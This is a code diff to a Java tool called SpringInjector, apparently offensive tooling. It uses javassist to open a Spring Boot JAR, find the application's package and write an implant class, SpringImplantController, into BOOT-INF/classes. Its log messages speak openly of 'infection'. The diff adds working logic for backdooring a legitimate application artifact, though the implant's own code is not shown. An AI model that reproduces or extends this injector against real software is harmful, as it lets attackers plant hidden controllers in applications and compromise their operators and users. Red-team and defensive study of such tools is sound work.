@@ -3,8 +3,10 @@ package org.example.injector;
 import javassist.CtClass;
 import javassist.bytecode.*;
 import javassist.bytecode.annotation.Annotation;
+import org.example.implants.SpringImplantController;
 
 import java.io.*;
+import java.nio.file.Files;
 import java.nio.file.Path;
 import java.util.Arrays;
 import java.util.Enumeration;
@@ -23,7 +25,11 @@ public class SpringInjector {
         try {
             Path targetPath = Path.of(args[0]);
             Path outputPath = Path.of(args[1]);
-            if (targetPath.toRealPath().equals(outputPath.toRealPath())) {
+            if (!Files.exists(targetPath) && !Files.isRegularFile(targetPath)) {
+                System.out.println("[!] Target JAR is not a regular existing file.");
+                System.exit(1);
+            }
+            if (Files.exists(outputPath) && targetPath.toRealPath().equals(outputPath.toRealPath())) {
                 System.out.println("[-] Target JAR and output JAR cannot be the same.");
                 System.exit(1);
             }
@@ -79,27 +85,59 @@ public class SpringInjector {
                     if (!hasComponentScanEnabled(classFile)) {
                         // TODO Explicitly add a @Bean to the configuration
                         // Maybe it doesn't hurt to add it despite @ContentScan being enabled?
-                        System.out.println("[-] Spring configuration is not set to scan for components (@ComponentScan). Infection not (yet) supported!");
-                        passEntry(targetJar, jarOutputStream, entry);
-                        continue;
-                    }
 
-                    didInfect = infectClass(classFile);
-                    if (didInfect) {
-                        newEntry(classFile, jarOutputStream, entry);
+//                        didInfect = infectClass(classFile);
+//                        if (didInfect) {
+//                            newEntry(classFile, jarOutputStream, entry);
+//                        } else {
+//                            passEntry(targetJar, jarOutputStream, entry);
+//                        }
+
+                        System.out.println("[-] Spring configuration is not set to scan for components (@ComponentScan). Infection not (yet) supported!");
+                        continue;
                     } else {
                         passEntry(targetJar, jarOutputStream, entry);
                     }
+
+                    // Just add a new class into the JAR
+                    String targetPackageName = getPackageNameFromClassFile(classFile);
+                    System.out.println("[+] Found package name: " + targetPackageName);
+                    ClassFile implantClass = loadImplantClass();
+                    implantClass.setName(targetPackageName + ".SpringImplantController");   // TODO Don't hardcode this
+                    String fullPathInsideJar = "BOOT-INF/classes/" + implantClass.getName().replace(".", "/") + ".class";
+                    JarEntry newJarEntry = new JarEntry(fullPathInsideJar);
+                    newEntry(implantClass, jarOutputStream, newJarEntry);
+                    System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
+                    didInfect = true;
                 }
             }
             jarOutputStream.close();
 
             if (foundSignedClasses) {
-                System.out.println("[-] Found signed classes. These will not be considered.");
+                System.out.println("[-] Found signed classes. These were not considered for infection.");
             }
         }
 
         return didInfect;
+    }
+
+    private String getPackageNameFromClassFile(final ClassFile classFile) {
+        String fqcn = classFile.getName();
+        String[] parts = fqcn.split("\\.");
+        if (parts.length < 2) {
+            throw new RuntimeException("Not a fully qualified class name: " + fqcn);
+        }
+        String[] packageParts = Arrays.copyOfRange(parts, 0, parts.length - 1);
+        String packageName = String.join(".", packageParts);
+        return packageName;
+    }
+
+    private ClassFile loadImplantClass() throws IOException {
+        try {
+            return ImplantReader.findAndReadClassFile(SpringImplantController.class);
+        } catch (ClassNotFoundException e) {
+            throw new RuntimeException(e);
+        }
     }
 
     private boolean infectClass(ClassFile classFile) {
